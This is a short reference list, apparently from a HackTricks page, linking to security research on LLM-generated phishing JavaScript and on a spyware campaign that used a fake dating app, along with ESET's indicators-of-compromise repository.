- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)

{{#include ../../banners/hacktricks-training.md}}
